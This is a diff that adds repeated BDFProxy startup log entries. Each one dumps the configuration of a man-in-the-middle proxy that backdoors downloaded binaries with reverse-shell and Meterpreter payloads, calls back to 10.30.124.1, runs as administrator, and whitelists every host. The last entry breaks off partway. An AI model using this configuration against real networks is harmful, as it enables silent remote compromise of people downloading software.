@@ -1159,3 +1159,1551 @@
         }
     }
 }
+2018-10-25 16:56:08,157 [*] ################ Starting BDFProxy ################
+2018-10-25 16:56:08,158 [*] ConfigDump {
+    "Overall": {
+        "MaxSizeFileRequested": "100000000", 
+        "certLocation": "~/.mitmproxy/mitmproxy-ca.pem", 
+        "loglevel": "INFO", 
+        "logname": "proxy.log", 
+        "proxyMode": "regular", 
+        "proxyPort": "8080", 
+        "resourceScriptFile": "bdfproxy_msf_resource.rc", 
+        "sslports": [
+            "443", 
+            "8443"
+        ]
+    }, 
+    "TAR": {
+        "blacklist": [], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "ZIP": {
+        "blacklist": [
+            ".dll"
+        ], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "hosts": {
+        "blacklist": [], 
+        "whitelist": "ALL"
+    }, 
+    "keywords": {
+        "blacklist": ".dll", 
+        "whitelist": "ALL"
+    }, 
+    "targets": {
+        "ALL": {
+            "CompressedFiles": "True", 
+            "FatPriority": "x64", 
+            "FileSizeMax": "10000000", 
+            "LinuxIntelx64": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "9999", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxIntelx86": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x86/shell_reverse_tcp", 
+                "PORT": "8888", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxType": "ALL", 
+            "MachoIntelx64": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "5555", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "MachoIntelx86": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "4444", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "WindowsIntelx64": {
+                "CODE_SIGN": "False", 
+                "HOST": "0.0.0.0", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/x64/shell/reverse_tcp", 
+                "PATCH_DLL": "True", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8088", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "pentest_x64_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsIntelx86": {
+                "CODE_SIGN": "False", 
+                "HOST": "0.0.0.0", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/meterpreter/reverse_tcp", 
+                "PATCH_DLL": "False", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8090", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "veil_go_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "XP_MODE": "True", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }, 
+        "sourceforge.org": {
+            "CompressedFiles": "False", 
+            "WindowsIntelx64": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsType": "x64"
+        }, 
+        "sysinternals.com": {
+            "CompressedFiles": "False", 
+            "LinuxType": "None", 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }
+    }
+}
+2018-10-25 17:04:56,123 [*] ################ Starting BDFProxy ################
+2018-10-25 17:04:56,134 [*] ConfigDump {
+    "Overall": {
+        "MaxSizeFileRequested": "100000000", 
+        "certLocation": "~/.mitmproxy/mitmproxy-ca.pem", 
+        "loglevel": "INFO", 
+        "logname": "proxy.log", 
+        "proxyMode": "regular", 
+        "proxyPort": "8080", 
+        "resourceScriptFile": "bdfproxy_msf_resource.rc", 
+        "sslports": [
+            "443", 
+            "8443"
+        ]
+    }, 
+    "TAR": {
+        "blacklist": [], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "ZIP": {
+        "blacklist": [
+            ".dll"
+        ], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "hosts": {
+        "blacklist": [], 
+        "whitelist": "ALL"
+    }, 
+    "keywords": {
+        "blacklist": ".dll", 
+        "whitelist": "ALL"
+    }, 
+    "targets": {
+        "ALL": {
+            "CompressedFiles": "True", 
+            "FatPriority": "x64", 
+            "FileSizeMax": "10000000", 
+            "LinuxIntelx64": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "9999", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxIntelx86": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x86/shell_reverse_tcp", 
+                "PORT": "8888", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxType": "ALL", 
+            "MachoIntelx64": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "5555", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "MachoIntelx86": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "4444", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "WindowsIntelx64": {
+                "CODE_SIGN": "False", 
+                "HOST": "0.0.0.0", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/x64/shell/reverse_tcp", 
+                "PATCH_DLL": "True", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8088", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "pentest_x64_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsIntelx86": {
+                "CODE_SIGN": "False", 
+                "HOST": "0.0.0.0", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/meterpreter/reverse_tcp", 
+                "PATCH_DLL": "False", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8090", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "veil_go_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "XP_MODE": "True", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }, 
+        "sourceforge.org": {
+            "CompressedFiles": "False", 
+            "WindowsIntelx64": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsType": "x64"
+        }, 
+        "sysinternals.com": {
+            "CompressedFiles": "False", 
+            "LinuxType": "None", 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }
+    }
+}
+2018-10-25 17:05:37,609 [*] ################ Starting BDFProxy ################
+2018-10-25 17:05:37,610 [*] ConfigDump {
+    "Overall": {
+        "MaxSizeFileRequested": "100000000", 
+        "certLocation": "~/.mitmproxy/mitmproxy-ca.pem", 
+        "loglevel": "INFO", 
+        "logname": "proxy.log", 
+        "proxyMode": "regular", 
+        "proxyPort": "8080", 
+        "resourceScriptFile": "bdfproxy_msf_resource.rc", 
+        "sslports": [
+            "443", 
+            "8443"
+        ]
+    }, 
+    "TAR": {
+        "blacklist": [], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "ZIP": {
+        "blacklist": [
+            ".dll"
+        ], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "hosts": {
+        "blacklist": [], 
+        "whitelist": "ALL"
+    }, 
+    "keywords": {
+        "blacklist": ".dll", 
+        "whitelist": "ALL"
+    }, 
+    "targets": {
+        "ALL": {
+            "CompressedFiles": "True", 
+            "FatPriority": "x64", 
+            "FileSizeMax": "10000000", 
+            "LinuxIntelx64": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "9999", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxIntelx86": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x86/shell_reverse_tcp", 
+                "PORT": "8888", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxType": "ALL", 
+            "MachoIntelx64": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "5555", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "MachoIntelx86": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "4444", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "WindowsIntelx64": {
+                "CODE_SIGN": "False", 
+                "HOST": "0.0.0.0", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/x64/shell/reverse_tcp", 
+                "PATCH_DLL": "True", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8088", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "pentest_x64_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsIntelx86": {
+                "CODE_SIGN": "False", 
+                "HOST": "0.0.0.0", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/meterpreter/reverse_tcp", 
+                "PATCH_DLL": "False", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8090", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "veil_go_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "XP_MODE": "True", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }, 
+        "sourceforge.org": {
+            "CompressedFiles": "False", 
+            "WindowsIntelx64": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsType": "x64"
+        }, 
+        "sysinternals.com": {
+            "CompressedFiles": "False", 
+            "LinuxType": "None", 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }
+    }
+}
+2018-10-25 17:15:23,624 [*] ################ Starting BDFProxy ################
+2018-10-25 17:15:23,625 [*] ConfigDump {
+    "Overall": {
+        "MaxSizeFileRequested": "100000000", 
+        "certLocation": "~/.mitmproxy/mitmproxy-ca.pem", 
+        "loglevel": "INFO", 
+        "logname": "proxy.log", 
+        "proxyMode": "regular", 
+        "proxyPort": "8080", 
+        "resourceScriptFile": "bdfproxy_msf_resource.rc", 
+        "sslports": [
+            "443", 
+            "8443"
+        ]
+    }, 
+    "TAR": {
+        "blacklist": [], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "ZIP": {
+        "blacklist": [
+            ".dll"
+        ], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "hosts": {
+        "blacklist": [], 
+        "whitelist": "ALL"
+    }, 
+    "keywords": {
+        "blacklist": ".dll", 
+        "whitelist": "ALL"
+    }, 
+    "targets": {
+        "ALL": {
+            "CompressedFiles": "True", 
+            "FatPriority": "x64", 
+            "FileSizeMax": "10000000", 
+            "LinuxIntelx64": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "9999", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxIntelx86": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x86/shell_reverse_tcp", 
+                "PORT": "8888", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxType": "ALL", 
+            "MachoIntelx64": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "5555", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "MachoIntelx86": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "4444", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "WindowsIntelx64": {
+                "CODE_SIGN": "False", 
+                "HOST": "0.0.0.0", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/x64/shell/reverse_tcp", 
+                "PATCH_DLL": "True", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8088", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "pentest_x64_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsIntelx86": {
+                "CODE_SIGN": "False", 
+                "HOST": "0.0.0.0", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/meterpreter/reverse_tcp", 
+                "PATCH_DLL": "False", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8090", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "veil_go_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "XP_MODE": "True", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }, 
+        "sourceforge.org": {
+            "CompressedFiles": "False", 
+            "WindowsIntelx64": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsType": "x64"
+        }, 
+        "sysinternals.com": {
+            "CompressedFiles": "False", 
+            "LinuxType": "None", 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }
+    }
+}
+2018-10-25 17:22:33,496 [*] ################ Starting BDFProxy ################
+2018-10-25 17:22:33,507 [*] ConfigDump {
+    "Overall": {
+        "MaxSizeFileRequested": "100000000", 
+        "certLocation": "~/.mitmproxy/mitmproxy-ca.pem", 
+        "loglevel": "INFO", 
+        "logname": "proxy.log", 
+        "proxyMode": "regular", 
+        "proxyPort": "8080", 
+        "resourceScriptFile": "bdfproxy_msf_resource.rc", 
+        "sslports": [
+            "443", 
+            "8443"
+        ]
+    }, 
+    "TAR": {
+        "blacklist": [], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "ZIP": {
+        "blacklist": [
+            ".dll"
+        ], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "hosts": {
+        "blacklist": [], 
+        "whitelist": "ALL"
+    }, 
+    "keywords": {
+        "blacklist": ".dll", 
+        "whitelist": "ALL"
+    }, 
+    "targets": {
+        "ALL": {
+            "CompressedFiles": "True", 
+            "FatPriority": "x64", 
+            "FileSizeMax": "10000000", 
+            "LinuxIntelx64": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "9999", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxIntelx86": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x86/shell_reverse_tcp", 
+                "PORT": "8888", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxType": "ALL", 
+            "MachoIntelx64": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "5555", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "MachoIntelx86": {
+                "HOST": "0.0.0.0", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "4444", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "WindowsIntelx64": {
+                "CODE_SIGN": "False", 
+                "HOST": "0.0.0.0", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/x64/shell/reverse_tcp", 
+                "PATCH_DLL": "True", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8088", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "pentest_x64_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsIntelx86": {
+                "CODE_SIGN": "False", 
+                "HOST": "0.0.0.0", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/meterpreter/reverse_tcp", 
+                "PATCH_DLL": "False", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8090", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "veil_go_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "XP_MODE": "True", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }, 
+        "sourceforge.org": {
+            "CompressedFiles": "False", 
+            "WindowsIntelx64": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsType": "x64"
+        }, 
+        "sysinternals.com": {
+            "CompressedFiles": "False", 
+            "LinuxType": "None", 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }
+    }
+}
+2018-10-25 17:24:09,664 [*] ################ Starting BDFProxy ################
+2018-10-25 17:24:09,667 [*] ConfigDump {
+    "Overall": {
+        "MaxSizeFileRequested": "100000000", 
+        "certLocation": "~/.mitmproxy/mitmproxy-ca.pem", 
+        "loglevel": "INFO", 
+        "logname": "proxy.log", 
+        "proxyMode": "regular", 
+        "proxyPort": "8080", 
+        "resourceScriptFile": "bdfproxy_msf_resource.rc", 
+        "sslports": [
+            "443", 
+            "8443"
+        ]
+    }, 
+    "TAR": {
+        "blacklist": [], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "ZIP": {
+        "blacklist": [
+            ".dll"
+        ], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "hosts": {
+        "blacklist": [], 
+        "whitelist": "ALL"
+    }, 
+    "keywords": {
+        "blacklist": ".dll", 
+        "whitelist": "ALL"
+    }, 
+    "targets": {
+        "ALL": {
+            "CompressedFiles": "True", 
+            "FatPriority": "x64", 
+            "FileSizeMax": "10000000", 
+            "LinuxIntelx64": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "9999", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxIntelx86": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x86/shell_reverse_tcp", 
+                "PORT": "8888", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxType": "ALL", 
+            "MachoIntelx64": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "5555", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "MachoIntelx86": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "4444", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "WindowsIntelx64": {
+                "CODE_SIGN": "False", 
+                "HOST": "10.30.124.1", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/x64/shell/reverse_tcp", 
+                "PATCH_DLL": "True", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8088", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "pentest_x64_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsIntelx86": {
+                "CODE_SIGN": "False", 
+                "HOST": "10.30.124.1", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/meterpreter/reverse_tcp", 
+                "PATCH_DLL": "False", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8090", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "veil_go_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "XP_MODE": "True", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }, 
+        "sourceforge.org": {
+            "CompressedFiles": "False", 
+            "WindowsIntelx64": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsType": "x64"
+        }, 
+        "sysinternals.com": {
+            "CompressedFiles": "False", 
+            "LinuxType": "None", 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }
+    }
+}
+2018-10-25 17:44:36,066 [*] ################ Starting BDFProxy ################
+2018-10-25 17:44:36,067 [*] ConfigDump {
+    "Overall": {
+        "MaxSizeFileRequested": "100000000", 
+        "certLocation": "~/.mitmproxy/mitmproxy-ca.pem", 
+        "loglevel": "INFO", 
+        "logname": "proxy.log", 
+        "proxyMode": "regular", 
+        "proxyPort": "8080", 
+        "resourceScriptFile": "bdfproxy_msf_resource.rc", 
+        "sslports": [
+            "443", 
+            "8443"
+        ]
+    }, 
+    "TAR": {
+        "blacklist": [], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "ZIP": {
+        "blacklist": [
+            ".dll"
+        ], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "hosts": {
+        "blacklist": [], 
+        "whitelist": "ALL"
+    }, 
+    "keywords": {
+        "blacklist": ".dll", 
+        "whitelist": "ALL"
+    }, 
+    "targets": {
+        "ALL": {
+            "CompressedFiles": "True", 
+            "FatPriority": "x64", 
+            "FileSizeMax": "10000000", 
+            "LinuxIntelx64": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "9999", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxIntelx86": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x86/shell_reverse_tcp", 
+                "PORT": "8888", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxType": "ALL", 
+            "MachoIntelx64": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "5555", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "MachoIntelx86": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "4444", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "WindowsIntelx64": {
+                "CODE_SIGN": "False", 
+                "HOST": "10.30.124.1", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/x64/shell/reverse_tcp", 
+                "PATCH_DLL": "True", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8088", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "pentest_x64_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsIntelx86": {
+                "CODE_SIGN": "False", 
+                "HOST": "10.30.124.1", 
+                "IDT_IN_CAVE": "False", 
+                "MSFPAYLOAD": "windows/meterpreter/reverse_tcp", 
+                "PATCH_DLL": "False", 
+                "PATCH_METHOD": "automatic", 
+                "PATCH_TYPE": "APPEND", 
+                "PORT": "8090", 
+                "PREPROCESS": "False", 
+                "RUNAS_ADMIN": "True", 
+                "SHELL": "iat_reverse_tcp_stager_threaded", 
+                "SUPPLIED_BINARY": "veil_go_payload.exe", 
+                "SUPPLIED_SHELLCODE": "None", 
+                "XP_MODE": "True", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }, 
+        "sourceforge.org": {
+            "CompressedFiles": "False", 
+            "WindowsIntelx64": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False"
+            }, 
+            "WindowsType": "x64"
+        }, 
+        "sysinternals.com": {
+            "CompressedFiles": "False", 
+            "LinuxType": "None", 
+            "WindowsIntelx86": {
+                "PATCH_DLL": "False", 
+                "ZERO_CERT": "True"
+            }, 
+            "WindowsType": "ALL"
+        }
+    }
+}
+2018-10-25 17:44:55,791 [*] ################ Starting BDFProxy ################
+2018-10-25 17:44:55,792 [*] ConfigDump {
+    "Overall": {
+        "MaxSizeFileRequested": "100000000", 
+        "certLocation": "~/.mitmproxy/mitmproxy-ca.pem", 
+        "loglevel": "INFO", 
+        "logname": "proxy.log", 
+        "proxyMode": "regular", 
+        "proxyPort": "8080", 
+        "resourceScriptFile": "bdfproxy_msf_resource.rc", 
+        "sslports": [
+            "443", 
+            "8443"
+        ]
+    }, 
+    "TAR": {
+        "blacklist": [], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "ZIP": {
+        "blacklist": [
+            ".dll"
+        ], 
+        "maxSize": "50000000", 
+        "patchCount": "5"
+    }, 
+    "hosts": {
+        "blacklist": [], 
+        "whitelist": "ALL"
+    }, 
+    "keywords": {
+        "blacklist": ".dll", 
+        "whitelist": "ALL"
+    }, 
+    "targets": {
+        "ALL": {
+            "CompressedFiles": "True", 
+            "FatPriority": "x64", 
+            "FileSizeMax": "10000000", 
+            "LinuxIntelx64": {
+                "HOST": "10.30.124.1", 
+                "MSFPAYLOAD": "linux/x64/shell_reverse_tcp", 
+                "PORT": "9999", 
+                "PREPROCESS": "False", 
+                "SHELL": "reverse_shell_tcp", 
+                "SUPPLIED_SHELLCODE": "None"
+            }, 
+            "LinuxIntelx86": {
